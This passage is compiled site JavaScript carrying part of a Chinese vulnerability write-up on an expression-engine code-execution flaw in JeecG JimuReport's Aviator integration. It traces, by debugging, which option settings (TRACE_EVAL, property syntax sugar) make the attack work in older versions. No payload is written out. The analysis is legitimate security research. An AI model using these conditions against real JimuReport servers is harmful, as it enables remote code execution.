\u7684\u66f4\u591a\u64cd\u4f5c\u53ef\u4ee5\u5728 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.AviatorEvaluatorInstance#innerCompile()"})," \u65b9\u6cd5\u65ad\u70b9\uff0c\u4e4b\u540e\u53ef\u4ee5\u8ddf\u5230 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.code.OptimizeCodeGenerator#callASM()"})," \u8c03\u7528 ASM \u7684\u89e3\u6790"]}),"\n",(0,s.jsx)(A.h3,{id:"\u9a8c\u8bc1\u731c\u60f3",children:"\u9a8c\u8bc1\u731c\u60f3"}),"\n",(0,s.jsxs)(A.p,{children:["\u5148\u9a8c\u8bc1\u4e0b\u731c\u60f3\u5728 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.code.asm.ASMCodeGenerator#onMethodName()"})," \u65ad\u70b9\u4fee\u6539\u8be5\u914d\u7f6e ",(0,s.jsx)(A.code,{children:"this.instance.getOptionValue(Options.TRACE_EVAL).bool = false"})]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807152957990",src:n(89414).Z+"",width:"1103",height:"576"})}),"\n",(0,s.jsxs)(A.p,{children:["\u9664\u6b64\u4e4b\u5916\u5728 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.runtime.type.AviatorJavaType#getValueFromEnv()"})," \u89e3\u6790 ",(0,s.jsx)(A.code,{children:"Base64Utils.decodeFromString"})," \u65b9\u6cd5\u65f6\uff0c",(0,s.jsx)(A.code,{children:"RuntimeUtils.getInstance(env).getOptionValue(Options.ENABLE_PROPERTY_SYNTAX_SUGAR).bool"})," \u4e3a flase \uff0c\u4e0d\u8fdb\u5165 ",(0,s.jsx)(A.code,{children:"getProperty"})," \u903b\u8f91\uff0c\u4e5f\u65ad\u70b9\u4fee\u6539\u4e00\u4e0b\u3002"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807153209728",src:n(92633).Z+"",width:"1103",height:"473"})}),"\n",(0,s.jsx)(A.p,{children:"\u6784\u9020\u8fd9\u4fe9\u6761\u4ef6\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\uff0c\u9a8c\u8bc1\u731c\u60f3"}),"\n",(0,s.jsxs)(A.ol,{children:["\n",(0,s.jsx)(A.li,{children:"TRACE_EVAL \u4e3a false"}),"\n",(0,s.jsx)(A.li,{children:"ENABLE_PROPERTY_SYNTAX_SUGAR \u4e3a true"}),"\n"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807153505210",src:n(18463).Z+"",width:"758",height:"629"})}),"\n",(0,s.jsx)(A.h3,{id:"\u54ea\u91cc\u7684\u53d8\u52a8",children:"\u54ea\u91cc\u7684\u53d8\u52a8\uff1f"}),"\n",(0,s.jsxs)(A.p,{children:["\u7136\u540e\u5c31\u662f\u770b\u54ea\u91cc\u52a0\u7684\u8fd9\u4e2a\u914d\u7f6e\uff1f",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.Options#isValidValue()"})," \u5bf9 ",(0,s.jsx)(A.code,{children:"TRACE_EVAL"})," \u8d4b\u503c\u4e3a true"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807155037450",src:n(72302).Z+"",width:"990",height:"478"})}),"\n",(0,s.jsxs)(A.p,{children:["\u6700\u7ec8\u95ee\u9898\u51fa\u5728 ",(0,s.jsx)(A.code,{children:"org.jeecg.modules.jmreport.desreport.express.ExpressUtil"})," \u7684 static \u65b9\u6cd5\u5757\u4e2d\uff0c\u4f4e\u7248\u672c\u4e2d\u5c06\u8be5\u503c\u8bbe\u4e3a true"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807155208199",src:n(21170).Z+"",width:"672",height:"98"})}),"\n",(0,s.jsx)(A.p,{children:"\u9ad8\u7248\u672c\u4e3a false"}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807155331007",src:n(64992).Z+"",width:"1356",height:"136"})})]})}function l(e={}){const{wrapper:A}={...(0,a.a)(),...e.components};return A?(0,s.jsx)(A,{...e,children:(0,s.jsx)(t,{...e})}):t(e)}},95838:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807111409385-754c9fd65f74a49b5e19d3fd1006212d.png"},29446:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807111809524-95b4621b756070cd654268db569801ec.png"},5703:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807112532434-61ae3abd5f3402f6ee4a060fe04a7a5d.png"},25019:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807112604647-3797886429f21e55764143c437437d1e.png"},55738:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807113101449-402f2bbbae54115292fc5968d486d312.png"},79479:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807113150049-0ec87d56cc8dec1d3a31fe5737542f17.png"},41361:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807121741077-6bdc30e0280ede863ae254667fd109d4.png"},5527:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807143426654-074b338885a76fefa4ab6dd783f486dc.png"},88656:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807143843482-f9dcde16ca53a35abcebafa42847821f.png"},35085:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807144306254-b55bda42b979a64c21ea2be25a2b3726.png"},89414:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807152957990-5fcbc7e5276b6b0bc264f77e14ac53fe.png"},92633:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807153209728-4acdb05ad66b614cd67c7546de022d15.png"},18463:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807153505210-2e43a847773b13ce49eac33d044cd2e2.png"},72302:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807155037450-9977a039d98baa37d9b5feb0140e7993.png"},21170:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807155208199-0733522b48ad96d70bd64236a385a598.png"},64992:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240807155331007-b96017a6f576420c5a0c07a76efdfbd6.png"},85988:(e,A,n)=>{n.d(A,{Z:()=>s});const s=n.p+"assets/images/image-20240819101851786-efa256d19b1c864e91d6e434578f3688.png"},11151:(e,A,n)=>{n.d(A,{Z:()=>r,a:()=>i});var s=n(67294);const a={},c=s.createContext(a);function i(e){const A=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(A):{...A,...e}}),[A,e])}function r(e){let A;return A=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(c.Provider,{value:A},e.children)}}}]);